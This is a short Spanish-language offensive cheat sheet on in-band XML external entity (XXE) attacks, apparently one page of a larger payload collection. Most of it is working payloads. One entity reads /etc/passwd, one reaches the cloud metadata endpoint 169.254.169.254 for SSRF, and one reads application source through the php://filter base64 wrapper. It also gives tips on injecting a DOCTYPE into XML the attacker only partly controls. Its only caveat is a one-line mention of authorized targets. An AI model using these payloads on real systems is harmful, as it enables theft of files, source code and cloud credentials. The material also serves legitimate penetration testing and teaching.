# XXE clásico (in-band)

Ver índice: [xxe.md](xxe.md). **Solo sobre objetivos autorizados.** Cuando el resultado se refleja en la respuesta.

## Lectura de ficheros

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```
La entidad `&xxe;` se sustituye por el contenido del fichero y aparece en la respuesta.

## SSRF vía XXE

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
<foo>&xxe;</foo>
```

## Leer código (PHP filter)

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

## Inyectar en XML ya existente

Si solo controlas un valor dentro de un XML, define el DOCTYPE al principio y referencia la entidad en el campo que controlas.

## Notas

- Si no ves el contenido reflejado → ve a [blind-oob.md](blind-oob.md).
- Prueba `file://`, `http://`, y wrappers según el stack.
